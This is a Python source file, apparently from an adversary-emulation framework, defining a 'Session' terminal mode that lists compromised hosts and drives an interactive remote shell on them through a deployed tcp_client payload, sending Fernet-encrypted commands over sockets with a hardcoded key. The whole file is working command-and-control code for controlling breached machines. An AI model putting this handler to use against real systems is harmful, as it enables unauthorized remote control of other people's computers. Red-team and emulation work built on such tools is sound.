import socket
import struct

from aioconsole import ainput
from cryptography.fernet import Fernet

from app.terminal.mode import Mode


class Session(Mode):

    def __init__(self, services, logger):
        super().__init__(services, logger)
        self.sessions = []
        self.addresses = []
        self.encryption_key = b'secretsecretsecretwbsecretsecretsecretsecre='

    async def execute(self, cmd):
        await self.execute_mode(cmd)

    async def info(self):
        print('SESSION allows you to view and enter compromised hosts')
        self.log.console('This mode requires the (stockpile) tcp_client.py payload to be deployed on a compromised host', 'blue')
        print('-> search: list all active sessions')
        print('-> pick [index]: jump into an active session')

    async def search(self):
        active = []
        for i, conn in enumerate(self.sessions):
            try:
                await self._send(conn, ' ')
                await self._receive(conn)
                active.append(dict(index=i, address=self.addresses[i]))
            except socket.error:
                del self.sessions[i]
                del self.addresses[i]
        self.log.console_table(active)

    async def pick(self, i):
        await self._send_target_commands(int(i.split(' ')[-1]))

    async def encrypt(self, message):
        f = Fernet(self.encryption_key)
        token = f.encrypt(message.encode('utf-8'))
        return token

    async def decrypt(self, ciphertext):
        f = Fernet(self.encryption_key)
        return f.decrypt(ciphertext)

    async def _send_target_commands(self, target):
        conn = self.sessions[target]
        await self._send(conn, ' ')
        self.log.console('Entered session - try "whoami"')
        while True:
            try:
                cwd = await self._receive(conn)
                print(cwd, end='')

                cmd = await ainput()
                if not cmd:
                    cmd = ' '
                if len(str.encode(cmd)) > 0:
                    await self._send(conn, cmd)
                    client_response = await self._receive(conn)
                    print(client_response, end='')

                    if cmd == 'cd':
                        continue
                    if cmd == 'background':
                        print('\n')
                        break
            except Exception as e:
                self.log.console('Connection was dropped', 'red')
                break

    async def _send(self, conn, msg):
        ciphertext = await self.encrypt(msg)
        conn.send(ciphertext)

    async def _receive(self, conn):
        raw_msg_len = await self._recvall(conn, 4)
        if not raw_msg_len:
            return None
        msg_len = struct.unpack('>I', raw_msg_len)[0]
        ciphertext = await self._recvall(conn, msg_len)
        output = await self.decrypt(ciphertext)
        return str(output, 'utf-8')

    @staticmethod
    async def _recvall(conn, n):
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data
